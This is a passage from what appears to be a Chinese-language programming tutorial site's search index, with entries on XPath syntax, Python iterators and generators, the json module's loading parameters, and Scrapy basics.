xml.selectNodes(\"/bookstore/book[1]/title\"); 选取所有价格 下面的例子选取 price 节点中的所有文本: /bookstore/book/price/text() 选取价格高于 35 的 price 节点 下面的例子选取价格高于 35 的所有 price 节点: /bookstore/book[price>35]/price 选取价格高于 35 的 title 节点 下面的例子选取价格高于 35 的所有 title 节点: /bookstore/book[price>35]/title","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Tutorial-XPath-Instance.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-XPath-Instance.html"},{"title":"XPath语法","text":"XPath 使用路径表达式来选取 XML 文档中的节点或节点集。节点是通过沿着路径 (path) 或者步 (steps) 来选取的。 XML 实例文档 我们将在下面的例子中使用这个 XML 文档: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <bookstore> <book> <title lang=\"eng\">Harry Potter</title> <price>29.99</price> </book> <book> <title lang=\"eng\">Learning XML</title> <price>39.95</price> </book> </bookstore> 选取节点 XPath 使用路径表达式在 XML 文档中选取节点。节点是通过沿着路径或者 step 来选取的。 下面列出了最有用的路径表达式： 表达式 描述 nodename 选取此节点的所有子节点。 / 从根节点选取（取子节点）。 用于开头表示绝对路径 // 从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置（取子孙节点）。 用于开头表示绝对路径 . 选取当前节点。 .. 选取当前节点的父节点。 @ 选取属性。 在下面的表格中，我们已列出了一些路径表达式以及表达式的结果 路径表达式 结果 bookstore 选取 bookstore 元素的所有子节点 /bookstore 选取根元素 bookstore 注释：假如路径起始于正斜杠( / )，则此路径始终代表到某元素的绝对路径！ bookstore/book 选取属于 bookstore 的子元素的所有 book 元素 //book 选取所有 book 子元素，而不管它们在文档中的位置 bookstore//book 选择属于 bookstore 元素的后代的所有 book 元素, 而不管它们位于 bookstore 之下的什么位置 //@lang 选取名为 lang 的所有属性 谓语（Predicates） 谓语用来查找某个特定的节点或者包含某个指定的值的节点。 谓语被嵌在方括号中。 在下面的表格中，我们列出了带有谓语的一些路径表达式，以及表达式的结果： 路径表达式 结果 /bookstore/book[1] 选取属于 bookstore 子元素的第一个 book 元素。 /bookstore/book[last()] 选取属于 bookstore 子元素的最后一个 book 元素。 /bookstore/book[last()-1] 选取属于 bookstore 子元素的倒数第二个 book 元素。 /bookstore/book[position()<3] 选取最前面的两个属于 bookstore 元素的子元素的 book 元素。 //title[@lang] 选取所有拥有名为 lang 的属性的 title 元素。 //title[@lang='eng'] 选取所有 title 元素，且这些元素拥有值为 eng 的 lang 属性。 /bookstore/book[price>35.00] 选取 bookstore 元素的所有 book 元素，且其中的 price 元素的值须大于 35.00。 /bookstore/book[price>35.00]//title 选取 bookstore 元素中的 book 元素的所有 title 元素， 且其中的 price 元素的值须大于 35.00。 选取未知节点 XPath 通配符可用来选取未知的 XML 元素。 ========== =========================== 通配符 描述 ========== =========================== * 匹配任何元素节点。 @* 匹配任何属性节点。 node() 匹配任何类型的节点。 ========== =========================== 在下面的表格中，我们列出了一些路径表达式，以及这些表达式的结果： 路径表达式 结果 /bookstore/* 选取 bookstore 元素的所有子元素。 //* 选取文档中的所有元素。 //title[@*] 选取所有带有属性的 title 元素。 选取若干路径 通过在路径表达式中使用\"|\"运算符，您可以选取若干个路径。 在下面的表格中，我们列出了一些路径表达式，以及这些表达式的结果： 路径表达式 结果 //book/title | //book/price 选取 book 元素的所有 title 和 price 元素 //title | //price 选取文档中的所有 title 和 price 元素 /bookstore/book/title | //price 选取属于 bookstore 元素的 book 元素的所有 title 元素, 以及文档中所有的 price 元素","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Tutorial-XPath-XPath-grammar.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-XPath-XPath-grammar.html"},{"title":"XPath节点","text":"XPath 术语 节点 在 XPath 中，有七种类型的节点： 元素 属性 文本 命名空间 处理指令 注释 文档（根）节点 XML 文档是被作为节点树来对待的。树的根被称为文档节点或者根节点。 请看下面这个 XML 文档: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <bookstore> <book> <title lang=\"en\">Harry Potter</title> <author>J K. Rowling</author> <year>2005</year> <price>29.99</price> </book> </bookstore> 上面的XML文档中的节点例子: <bookstore> (文档节点) <author>J K. Rowling</author> (元素节点) lang=\"en\" (属性节点) 基本值（或称原子值，Atomic value） 基本值是无父或无子的节点。 基本值的例子: J K. Rowling \"en\" 项目（Item） 项目是基本值或者节点。 节点关系 父（Parent） 每个元素以及属性都有一个父。 在下面的例子中，book 元素是 title、author、year 以及 price 元素的父: <book> <title>Harry Potter</title> <author>J K. Rowling</author> <year>2005</year> <price>29.99</price> </book> 子（Children） 元素节点可有零个、一个或多个子。 在下面的例子中，title、author、year 以及 price 元素都是 book 元素的子: <book> <title>Harry Potter</title> <author>J K. Rowling</author> <year>2005</year> <price>29.99</price> </book> 同胞（Sibling） 拥有相同的父的节点 在下面的例子中，title、author、year 以及 price 元素都是同胞: <book> <title>Harry Potter</title> <author>J K. Rowling</author> <year>2005</year> <price>29.99</price> </book> 先辈（Ancestor） 某节点的父、父的父，等等。 在下面的例子中，title 元素的先辈是 book 元素和 bookstore 元素: <bookstore> <book> <title>Harry Potter</title> <author>J K. Rowling</author> <year>2005</year> <price>29.99</price> </book> </bookstore> 后代（Descendant） 某个节点的子，子的子，等等。 在下面的例子中，bookstore 的后代是 book、title、author、year 以及 price 元素: <bookstore> <book> <title>Harry Potter</title> <author>J K. Rowling</author> <year>2005</year> <price>29.99</price> </book> </bookstore>","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Tutorial-XPath-XPath-node.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-XPath-XPath-node.html"},{"title":"XPath 轴（Axes）","text":"XML 实例文档 我们将在下面的例子中使用此 XML 文档: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <bookstore> <book> <title lang=\"en\">Harry Potter</title> <price>29.99</price> </book> <book> <title lang=\"en\">Learning XML</title> <price>39.95</price> </book> </bookstore> 轴可定义相对于当前节点的节点集。 轴名称 结果 ancestor 选取当前节点的所有先辈（父、祖父等）。 ancestor-or-self 选取当前节点的所有先辈（父、祖父等）以及当前节点本身。 attribute 选取当前节点的所有属性。 child 选取当前节点的所有子元素。 descendant 选取当前节点的所有后代元素（子、孙等）。 descendant-or-self 选取当前节点的所有后代元素（子、孙等）以及当前节点本身。 following 选取文档中当前节点的结束标签之后的所有节点。 following-sibling 选取当前节点之后的所有兄弟节点 namespace 选取当前节点的所有命名空间节点。 parent 选取当前节点的父节点。 preceding 选取文档中当前节点的开始标签之前的所有节点。 preceding-sibling 选取当前节点之前的所有同级节点。 self 选取当前节点。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Tutorial-XPath-XPath-shaft.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-XPath-XPath-shaft.html"},{"title":"迭代器/生成器","text":"手动遍历迭代器 使用 next() 函数并在代码中捕获 StopIteration 异 常: def manual_iter(): with open('/etc/passwd') as f: try: while True: line = next(f) print(line, end='') except StopIteration: pass 通常来讲，StopIteration 用来指示迭代的结尾。 然而，还可以通过返回一个指定值来标记结尾，比如 None 。下面是 示例: with open('/etc/passwd') as f: while True: line = next(f, None) if line is None: break print(line, end='') 大多数情况下，我们会使用 for 循环语句用来遍历一个可迭代对象。 但是，偶尔也 需要对迭代做更加精确的控制，这时候了解底层迭代机制就显得尤为重要了: >>> items = [1, 2, 3] >>> # Get the iterator >>> it = iter(items) # Invokes items.__iter__() >>> # Run the iterator >>> next(it) # Invokes it.__next__() 1 >>> next(it) 2 >>> next(it) 3 >>> next(it) Traceback (most recent call last): File \"<stdin>\", line 1, in <module> StopIteration >>> 代理迭代 你构建了一个自定义容器对象，里面包含有列表、元组或其他可迭代对象。你想直 接在你的这个新容器对象上执行迭代操作 实际上你只需要定义一个 __iter__() 方法，将迭代操作代理到容器内部的对象上 去。比如: class Node: def __init__(self, value): self._value = value self._children = [] def __repr__(self): return 'Node({!r})'.format(self._value) def add_child(self, node): self._children.append(node) def __iter__(self): return iter(self._children) Python 的迭代器协议需要 __iter__() 方法返回一个实现了 __next__() 方法的 迭代器对象。 如果你只是迭代遍历其他容器的内容，你无须担心底层是怎样实现的。你 所要做的只是传递迭代请求既可。 这里的 iter() 函数的使用简化了代码，iter(s) 只是简单的通过调用 s. __iter__() 方法来返回对应的迭代器对象， 就跟 len(s) 会调用 s.__len__() 原理 是一样的。 使用生成器创建新的迭代模式 你想实现一个自定义迭代模式，跟普通的内置函数比如 range() , reversed() 不 一样: def frange(start, stop, increment): x = start while x < stop: yield x x += increment 一个函数中需要有一个 yield 语句即可将其转换为一个生成器。跟普通函数不同 的是，生成器只能用于迭代操作。 一个生成器函数主要特征是它只会回应在迭代中使用到的 next 操作。一旦生成器 函数返回退出，迭代终止。 我们在迭代中通常使用的 for 语句会自动处理这些细节，所 以你无需担心。 实现迭代器协议 构建一个能支持迭代操作的自定义对象，并希望找到一个能实现迭代协议的 简单方法。 目前为止，在一个对象上实现迭代最简单的方式是使用一个生成器函数. 你可能想实现一个以深度优先方式遍历树形 节点的生成器。下面是代码示例: class Node: def __init__(self, value): self._value = value self._children = [] def __repr__(self): return 'Node({!r})'.format(self._value) def add_child(self, node): self._children.append(node) def __iter__(self): return iter(self._children) def depth_first(self): yield self for c in self: yield from c.depth_first() 反向迭代 反方向迭代一个序列 使用内置的 reversed() 函数: >>> a = [1, 2, 3, 4] >>> for x in reversed(a): ... print(x) ... 4 3 2 1 反向迭代仅仅当对象的大小可预先确定或者对象实现了 __reversed__() 的特殊 方法时才能生效。 如果两者都不符合，那你必须先将对象转换为一个列表才行: # Print a file backwards f = open('somefile') for line in reversed(list(f)): print(line, end='') 要注意的是如果可迭代对象元素很多的话，将其预先转换为一个列表要消耗大量 的内存 很多程序员并不知道可以通过在自定义类上实现 __reversed__() 方法来实现反 向迭代。比如: class Countdown: def __init__(self, start): self.start = start # Forward iterator def __iter__(self): n = self.start while n > 0: yield n n -= 1 # Reverse iterator def __reversed__(self): n=1 while n <= self.start: yield n n += 1 定义一个反向迭代器可以使得代码非常的高效，因为它不再需要将数据填充到一 个列表中然后再去反向迭代这个列表: from collections import deque class linehistory: def __init__(self, lines, histlen=3): self.lines = lines self.history = deque(maxlen=histlen) def __iter__(self): for lineno, line in enumerate(self.lines, 1): self.history.append((lineno, line)) yield line def clear(self): self.history.clear() 带有外部状态的生成器函数 定义一个生成器函数，但是它会调用某个你想暴露给用户使用的外部状态值 如果你想让你的生成器暴露外部状态给用户，别忘了你可以简单的将它实现为一 个类，然后把生成器函数放到 __iter__() 方法中过去 迭代器切片 你想得到一个由迭代器生成的切片对象，但是标准切片操作并不能做到。 函数 itertools.islice() 正好适用于在迭代器和生成器上做切片操作。比如: >>> def count(n): ... while True: ... yield n ... n += 1 ... >>> c = count(0) >>> c[10:20] Traceback (most recent call last): File \"<stdin>\", line 1, in <module> TypeError: 'generator' object is not subscriptable >>> # Now using islice() >>> import itertools >>> for x in itertools.islice(c, 10, 20): ... print(x) ... 10 11 12 13 14 15 16 17 18 19 >>> 迭代器和生成器不能使用标准的切片操作，因为它们的长度事先我们并不知道 (并 且也没有实现索引)。 函数 islice() 返回一个可以生成指定元素的迭代器，它通过遍 历并丢弃直到切片开始索引位置的所有元素。 然后才开始一个个的返回元素，并直到切 片结束索引位置。 这里要着重强调的一点是 islice() 会消耗掉传入的迭代器中的数据。 必须考虑到 迭代器是不可逆的这个事实。所以如果你需要之后再次访问这个迭代器的话，那你就得 先将它里面的数据放入一个列表中。 跳过可迭代对象的开始部分 你想遍历一个可迭代对象，但是它开始的某些元素你并不感兴趣，想跳过它们。 itertools 模块中有一些函数可以完成这个任务。首先介绍的是 itertools. dropwhile() 函数。 使用时，你给它传递一个函数对象和一个可迭代对象。 它会返 回一个迭代器对象，丢弃原有序列中直到函数返回 Flase 之前的所有元素，然后返回后 面所有元素。 如果你想跳过开始部分的注释行的话，可以这样做: >>> from itertools import dropwhile >>> with open('/etc/passwd') as f: ... for line in dropwhile(lambda line: line.startswith('#'), f): ... print(line, end='') ... nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false root:*:0:0:System Administrator:/var/root:/bin/sh ... >>> 这个例子是基于根据某个测试函数跳过开始的元素。 如果你已经明确知道了要跳 过的元素的个数的话，那么可以使用 itertools.islice() 来代替。比如: >>> from itertools import islice >>> items = ['a', 'b', 'c', 1, 4, 10, 15] >>> for x in islice(items, 3, None): ... print(x) ... 1 4 10 15 islice() 函数最后那个 None 参数指定了你要获取从第 3 个到最 后的所有元素， 如果 None 和 3 的位置对调，意思就是仅仅获取前三个元素恰恰相反， (这个跟切片的相反操作 [3:] 和 [:3] 原理是一样的)。 排列组合的迭代 你想迭代遍历一个集合中元素的所有可能的排列或组合, 即 全排列 问题. itertools 模块提供了三个函数来解决这类问题。 其中一个是 itertools.permutations() ，它接受一个集合并产生一个元组序列，每个元组由集合中所有 元素的一个可能排列组成。 也就是说通过打乱集合中元素排列顺序生成一个元组，比 如: >>> items = ['a', 'b', 'c'] >>> from itertools import permutations >>> for p in permutations(items): ... print(p) ... ('a', 'b', 'c') ('a', 'c', 'b') ('b', 'a', 'c') ('b', 'c', 'a') ('c', 'a', 'b') ('c', 'b', 'a') >>> 如果你想得到指定长度的所有排列，你可以传递一个可选的长度参数。就像这样: >>> for p in permutations(items, 2): ... print(p) ... ('a', 'b') ('a', 'c') ('b', 'a') ('b', 'c') ('c', 'a') ('c', 'b') >>> 使用 itertools.combinations() 可得到输入集合中元素的所有的组合。比如: >>> from itertools import combinations >>> for c in combinations(items, 3): ... print(c) ... ('a', 'b', 'c') >>> for c in combinations(items, 2): ... print(c) ... ('a', 'b') ('a', 'c') ('b', 'c') >>> for c in combinations(items, 1): ... print(c) ... ('a',) ('b',) ('c',) >>> 对于 combinations() 来讲，元素的顺序已经不重要了。 也就是说，组合 ('a', 'b') 跟 ('b', 'a') 其实是一样的 (最终只会输出其中一个)。 在计算组合的时候，一旦元素被选取就会从候选中剔除掉 (比如如果元 素'a'已经被选取了，那么接下来就不会再考虑它了)。 而函数 itertools. combinations_with_replacement() 允许同一个元素被选择多次，比如: >>> for c in combinations_with_replacement(items, 3): ... print(c) ... ('a', 'a', 'a') ('a', 'a', 'b') ('a', 'a', 'c') ('a', 'b', 'b') ('a', 'b', 'c') ('a', 'c', 'c') ('b', 'b', 'b') ('b', 'b', 'c') ('b', 'c', 'c') ('c', 'c', 'c') >>> 当我们碰到看上去有些复杂的迭 代问题时，最好可以先去看看 itertools 模块。 如果这个问题很普遍，那么很有可能会在 里面找到解决方案! 序列上索引值迭代 你想在迭代一个序列的同时跟踪正在被处理的元素索引。 内置的 enumerate() 函数可以很好的解决这个问题, enumerate 接受一个参数作为起始序号, 默认为0: >>> my_list = ['a', 'b', 'c'] >>> for idx, val in enumerate(my_list, 1): ... print(idx, val) ... 1a 2b 3c enumerate() 函数返回的是一个 enumerate 对象实例，它是一个迭代器，返回连 续的包含一个计数和一个值的元组， 元组中的值通过在传入序列上调用 next() 返回。 还有一点可能并不很重要，但是也值得注意，有时候当你在一个已经解压后的元组 序列上使用 enumerate() 函数时很容易调入陷阱。 你得像下面正确的方式这样写: data = [ (1, 2), (3, 4), (5, 6), (7, 8) ] # Correct! for n, (x, y) in enumerate(data): ... # Error! for n, x, y in enumerate(data): ... 同时迭代多个序列 你想同时迭代多个序列，每次分别从一个序列中取一个元素。 使用 zip() 函数: >>> xpts = [1, 5, 4, 2, 10, 7] >>> ypts = [101, 78, 37, 15, 62, 99] >>> for x, y in zip(xpts, ypts): ... print(x,y) ... 1 101 5 78 4 37 2 15 10 62 7 99 >>> zip(a, b) 会生成一个可返回元组 (x, y) 的迭代器，其中 x 来自 a，y 来自 b。 一 旦其中某个序列到底结尾，迭代宣告结束。因此迭代长度跟参数中最短序列长度一致。 如果这个不是你想要的效果，那么还可以使用 itertools.zip_longest() 函数来 代替: >>> from itertools import zip_longest >>> for i in zip_longest(a,b): ... print(i) ... (1, 'w') (2, 'x') (3, 'y') (None, 'z') >>> for i in zip_longest(a, b, fillvalue=0): ... print(i) ... (1, 'w') (2, 'x') (3, 'y') (0, 'z') >>> 不同集合上元素的迭代 你想在多个对象执行相同的操作，但是这些对象在不同的容器中，你希望代码在不 失可读性的情况下避免写重复的循环。 itertools.chain() 方法可以用来简化这个任务。 它接受一个可迭代对象列表作 为输入，并返回一个迭代器，有效的屏蔽掉在多个容器中迭代细节。 为了演示清楚，考 虑下面这个例子: >>> from itertools import chain >>> a = [1, 2, 3, 4] >>> b = ['x', 'y', 'z'] >>> for x in chain(a, b): ... print(x) ... 1 2 3 4 x y z >>> tertools.chain() 接受一个或多个可迭代对象最为输入参数。 然后创建一个迭 代器，依次连续的返回每个可迭代对象中的元素。 这种方式要比先将序列合并再迭代要 高效的多。 创建数据处理管道 以数据管道 (类似 Unix 管道) 的方式迭代处理数据。比如，你有个大量的数据 需要处理，但是不能将它们一次性放入内存中。 生成器函数是一个实现管道机制的好办法 函数内使用 yield 作为生产者, 外部 for 作为 消费者, 来组成处理管道. 展开嵌套的序列 你想将一个多层嵌套的序列展开成一个单层列表 yield from 在你想在生成器中调用其他生成器作为子例程的时候非常有用 顺序迭代合并后的排序迭代对象 有一系列排序序列，想将它们合并后得到一个排序序列并在上面迭代遍历。 heapq.merge() 函数: >>> import heapq >>> a = [1, 4, 7, 10] >>> b = [2, 5, 6, 11] >>> for c in heapq.merge(a, b): ... print(c) ... 1 2 4 5 6 7 10 11 heapq.merge 可迭代特性意味着它不会立马读取所有序列。这就意味着你可以在 非常长的序列中使用它，而不会有太大的开销。 比如，下面是一个例子来演示如何合并 两个排序文件: with open('sorted_file_1', 'rt') as file1, \\ open('sorted_file_2', 'rt') as file2, \\ open('merged_file', 'wt') as outf: for line in heapq.merge(file1, file2): outf.write(line) 有一点要强调的是 heapq.merge() 需要所有输入序列必须是排过序的。 特别的， 它并不会预先读取所有数据到堆栈中或者预先排序，也不会对输入做任何的排序检测。 它仅仅是检查所有序列的开始部分并返回最小的那个，这个过程一直会持续直到所有 输入序列中的元素都被遍历完。 迭代器代替 while 无限循环 你在代码中使用 while 循环来迭代处理数据，因为它需要调用某个函数或者和一 般迭代模式不同的测试条件。 能不能用迭代器来重写这个循环呢? 一个常见的 IO 操作程序可能会想下面这样: CHUNKSIZE = 8192 def reader(s): while True: data = s.recv(CHUNKSIZE) if data == b'': break process_data(data) 这种代码通常可以使用 iter() 来代替，如下所示: def reader2(s): for chunk in iter(lambda: s.recv(CHUNKSIZE), b''): pass # process_data(data) iter 函数一个鲜为人知的特性是它接受一个可选的 callable 对象和一个标记 (结 尾) 值作为输入参数。 当以这种方式使用的时候，它会创建一个迭代器，这个迭代器会 不断调用 callable 对象直到返回值和标记值相等为止。 迭代器与生成器区别 迭代器提供一种顺序访问集合或序列元素的方式，使用 next() 方法获取每个元素。 生成器是一种特殊类型的函数，通过使用 yield 关键字生成序列值， 每次调用生成器函数返回一个迭代器对象，通过迭代器对象可以按需获取生成的序列值。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-cookbook-Iterator,-generator.html","loc":"/yq-doc-source-docs-rear-end-python-cookbook-Iterator,-generator.html"},{"title":"json","text":"四大方法: json.load 将文件中的json的格式转化成python对象提取出来, 操作的是文件流 json.loads 将Json字符串解码成python对象, 操作的是字符串 json.dump 将python中的对象转化成json储存到文件中, 需要传入打开的文件流 json.dumps 将python对象编码成Json字符串 dump()及其参数 load()的参数 我们先看下json.loads方法的签名: def loads(s, encoding=None, cls=None, object_hook=None, parse_float=None, parse_int=None, parse_constant=None, object_pairs_hook=None, **kw): \"\"\"Deserialize ``s`` (a ``str`` or ``unicode`` instance containing a JSON # 把一个字符串反序列化为Python对象，这个字符串可以是str类型的，也可以是unicode类型的 document) to a Python object. If ``s`` is a ``str`` instance and is encoded with an ASCII based encoding # 如果参数s是以ASCII编码的字符串，那么需要手动通过参数encoding指定编码方式， other than utf-8 (e.g. latin-1) then an appropriate ``encoding`` name # 不是以ASCII编码的字符串，是不被允许的，你必须把它转为unicode must be specified. Encodings that are not ASCII based (such as UCS-2) are not allowed and should be decoded to ``unicode`` first. ``object_hook`` is an optional function that will be called with the # object_hook参数是可选的，它会将（loads的)返回结果字典替换为你所指定的类型 result of any object literal decode (a ``dict``). The return value of # 这个功能可以用来实现自定义解码器，如JSON-RPC ``object_hook`` will be used instead of the ``dict``. This feature can be used to implement custom decoders (e.g. JSON-RPC class hinting). ``object_pairs_hook`` is an optional function that will be called with the # object_pairs_hook参数是可选的，它会将结果以key-value列表的形式返回 result of any object literal decoded with an ordered list of pairs. The # 形式如：[(k1, v1), (k2, v2), (k3, v3)] return value of ``object_pairs_hook`` will be used instead of the ``dict``. # 如果object_hook和object_pairs_hook同时指定的话优先返回object_pairs_hook This feature can be used to implement custom decoders that rely on the order that the key and value pairs are decoded (for example, collections.OrderedDict will remember the order of insertion). If ``object_hook`` is also defined, the ``object_pairs_hook`` takes priority. ``parse_float``, if specified, will be called with the string # parse_float参数是可选的，它如果被指定的话，在解码json字符串的时候， of every JSON float to be decoded. By default this is equivalent to # 符合float类型的字符串将被转为你所指定的，比如说你可以指定为decimal.Decimal float(num_str). This can be used to use another datatype or parser for JSON floats (e.g. decimal.Decimal). ``parse_int``, if specified, will be called with the string # parse_int参数是可选的，它如果被指定的话，在解码json字符串的时候， of every JSON int to be decoded. By default this is equivalent to # 符合int类型的字符串将被转为你所指定的，比如说你可以指定为float int(num_str). This can be used to use another datatype or parser for JSON integers (e.g. float). ``parse_constant``, if specified, will be called with one of the # parse_constant参数是可选的，它如果被指定的话，在解码json字符串的时候， following strings: -Infinity, Infinity, NaN. # 如果出现以以下字符串: -Infinity, Infinity, NaN 那么指定的parse_constant方法将会被调用到 This can be used to raise an exception if invalid JSON numbers are encountered. To use a custom ``JSONDecoder`` subclass, specify it with the ``cls`` # 你也可以用cls参数通过实现一个JSONDecoder的子类，来代替JSONDecoder,通过这个功能你可以自定义上面的那些parse_xxx参数,这里就不举例了 kwarg; otherwise ``JSONDecoder`` is used. \"\"\" 以下参数说明是根据官方文档翻译的 s参数 把一个字符串反序列化为Python对象，这个字符串可以是str类型的，也可以是unicode类型的， 如果参数s是以ASCII编码的字符串，那么需要手动通过参数encoding指定编码方式， 不是以ASCII编码的字符串，是不被允许的，你必须把它转为unicode 对于loads方法来说，s是一个字符串，而对于load方法来说，是一个数据流文件 object_hook参数 object_hook参数是可选的，它会将（loads的)返回结果字典替换为你所指定的类型,这个功能可以用来实现自定义解码器，如JSON-RPC 这里先定义一个Person对象: class Person: def __init__(self, name, age, gender): self.name = name self.age = age self.gender = gender def toJSON(self): return { \"name\": self.name, \"age\": self.age, \"gender\": self.gender } @staticmethod def parseJSON(dct): if isinstance(dct, dict): p = Person(dct[\"name\"], int(dct['age']), dct['gender']) return p return dct OK，试下object_hook参数吧: s = '{\"name\": \"马云\", \"age\": 54, \"gender\": \"man\"}' # 测试json.loads方法的object_hook参数 p = json.loads(s, object_hook=Person.parseJSON) print(\"json.loads 是否将字符串转为字典了: --> \" + str(isinstance(p, dict))) print(\"json.loads 是否将字符串转为Person对象了: --> \" + str(isinstance(p, Person))) object_pairs_hook参数 object_pairs_hook参数是可选的，它会将结果以key-value有序列表的形式返回, 形式如: [(k1, v1), (k2, v2), (k3, v3)] , 如果object_hook和object_pairs_hook同时指定的话优先返回object_pairs_hook: s = '{\"name\": \"马云\", \"age\": 54, \"gender\": \"man\"}' # 测试json.loads方法的object_pairs_hook参数 print(\"-\" * 30 + \"> test object_pairs_hook <\" + \"-\" * 30) p = json.loads(s, object_hook=Person.parseJSON, object_pairs_hook=collections.OrderedDict) # p = json.loads(s, object_hook=Person.parseJSON, object_pairs_hook=Person.parseJSON) print(\"json.loads 测试同时指定object_hook和object_pairs_hook,最终调用哪个参数: --> \" + str(type(p))) print(\"json.loads 指定object_pairs_hook结果将会返回一个有序列表 --> {}\".format(p)) parse_float参数 parse_float参数是可选的，它如果被指定的话，在解码json字符串的时候， 符合float类型的字符串将被转为你所指定的，比如说你可以指定为decimal.Decimal 测试json.loads方法的parse_float参数: print(\"-\" * 30 + \"> test parse_float <\" + \"-\" * 30) p = json.loads(\"123.456\", parse_float=decimal.Decimal) print(\"json.loads 通过parse_float参数将原本应该转为float类型的字符串转为decimal类型: type(json.loads(\\\"123.456\\\", parse_float=decimal.Decimal)) --> \" + str(type(p))) print(\"\") parse_int参数 parse_int参数是可选的，它如果被指定的话，在解码json字符串的时候， 符合int类型的字符串将被转为你所指定的，比如说你可以指定为float 测试json.loads方法的parse_int参数: print(\"-\" * 30 + \"> test parse_int <\" + \"-\" * 30) p = json.loads(\"123\", parse_int=float) print(\"json.loads 通过parse_int参数将原本应该转为int类型的字符串转为float类型: type(json.loads(\\\"123\\\", parse_int=float)) --> \" + str(type(p))) parse_constant参数 parse_constant参数是可选的，它如果被指定的话，在解码json字符串的时候， 如果出现以以下字符串:-Infinity，Infinity，NaN那么指定的parse_constant方法将会被调用到: def transform(s): \"\"\" 此方法作为参数传给json.load(s)方法的parse_转译NAN, -Infinity,Infinity :param s: :return: \"\"\" # NaN --> not a number if \"NaN\" == s: return \"Not a Number\" # 将负无穷大转为一个非常小的数 elif \"-Infinity\" == s: return -999999 # 将正无穷大转为一个非常大的数 elif \"Infinity\" == s: return 999999 else: return s # 测试json.loads方法的parse_constant参数 print(\"-\" * 30 + \"> test parse_constant <\" + \"-\" * 30) print(\"json.loads Infinity: --> \" + str(json.loads('Infinity'))) print(\"json.loads parse_constant convert Infinity: --> \" + str(json.loads('Infinity', parse_constant=transform_constant))) print(\"json.loads -Infinity: --> \" + str(json.loads('-Infinity'))) print(\"json.loads parse_constant convert -Infinity: --> \" + str(json.loads('-Infinity', parse_constant=transform_constant))) print(\"json.loads NaN: --> \" + str(json.loads('NaN'))) print(\"json.loads parse_constant convert NaN : --> \" + str(json.loads('NaN', parse_constant=transform_constant))) print(\"\") cls参数 通过官方文档的注释我们可以知道json.load(s)方法具体的实现是通过JSONCoder类实现的， 而cls参数是用于自定义一个JSONCoder的子类，用于替换JSONCoder类，,通过这个功能你可以自定义上面的那些parse_xxx参数，这里就不举例了 原文链接: https://blog.csdn.net/daerzei/article/details/100598901 dump和dumps的区别 json.dumps() 是把python对象转换成json对象的一个过程，生成的是字符串。 json.dump() 是把python对象转换成json对象生成一个fp的文件流，和文件相关。 loads和load 下面主要分析讲解一下json的loads和load方法。 这两个方法中都是把其他类型的对象转为Python对象，这里先说明一下Python对象， Python对象包括： 所有Python基本数据类型，列表，元组，字典，自己定义的类，等等等等，当然不包括Python的字符串类型，把字符串或者文件鎏中的字符串转为字符串会报错的 先来一个例子，除了要转换的对象，其他什么参数都不传: s = '{\"name\": \"wade\", \"age\": 54, \"gender\": \"man\"}' # json.loads读取字符串并转为Python对象 print(\"json.loads将字符串转为Python对象: type(json.loads(s)) = {}\".format(type(json.loads(s)))) print(\"json.loads将字符串转为Python对象: json.loads(s) = {}\".format(json.loads(s))) # json.load读取文件并将文件内容转为Python对象 # 数据文件要s.json的内容 --> {\"name\": \"wade\", \"age\": 54, \"gender\": \"man\"} with open('s.json', 'r') as f: s1 = json.load(f) print(\"json.load将文件内容转为Python对象: type(json.load(f)) = {}\".format(type(s1))) print(\"json.load将文件内容转为Python对象: json.load(f) = {}\".format(s1)) 日常工作中最常见的就是把字符串通过json.loads转为字典， 其实json的loads方法不仅可以把字符串转为字典，还可以转为任何Python对象。 比如说，转成python基本数据类型: print('json.loads 将整数类型的字符串转为int类型: type(json.loads(\"123456\"))) --> {}'.format(type(json.loads(\"123456\")))) print('json.loads 将浮点类型的字符串转为float类型: type(json.loads(\"123.456\")) --> {}'.format(type(json.loads(\"123.456\")))) print('json.loads 将boolean类型的字符串转为bool类型: type(json.loads(\"true\")) --> {}'.format((type(json.loads(\"true\"))))) print('json.loads 将列表类型的字符串转为列表: type(json.loads(\\'[\"a\", \"b\", \"c\"]\\')) --> {}'.format(type(json.loads('[\"a\", \"b\", \"c\"]')))) print('json.loads 将字典类型的字符串转为字典: type(json.loads(\\'{\"a\": 1, \"b\": 1.2, \"c\": true, \"d\": \"ddd\"}\\')) --> %s' % str(type(json.loads('{\"a\": 1, \"b\": 1.2, \"c\": true, \"d\": \"ddd\"}')))) json模块会根据你的字符串自动转为最符合的数据类型， 但是需要注意的是不能转为字符串，否则会报json.decoder.JSONDecodeError错误: json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-json.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-json.html"},{"title":"Scrapy shell","text":"交互式终端工具 参考: https://docs.scrapy.org/en/latest/topics/shell.html#topics-shell 如果有安装 IPython , 就会使用 IPython , 否则使用默认 Python 的交互式终端 启动: scrapy shell <url> url 想爬取的 url 地址. 也支持本地的 html 文件: # UNIX-style scrapy shell ./path/to/file.html scrapy shell ../other/path/to/file.html scrapy shell /absolute/path/to/file.html # File URI scrapy shell file:///absolute/path/to/file.html 支持的指令 view 从浏览器打开: >>> view(response) True","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Scrapy-shell.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Scrapy-shell.html"},{"title":"使用","text":"制作 Scrapy 爬虫 一共需要4步： 新建项目 (scrapy startproject xxx)：新建一个新的爬虫项目 明确目标 （编写items.py）：明确你想要抓取的目标 制作爬虫 （spiders/xxspider.py）：制作爬虫开始爬取网页 存储内容 （pipelines.py）：设计管道存储爬取内容 新建项目 创建一个工作目录workdir并进入: mkdir workdir; cd workdir 创建虚拟环境(省略)并安装依赖: pip install Scrapy 创建项目: 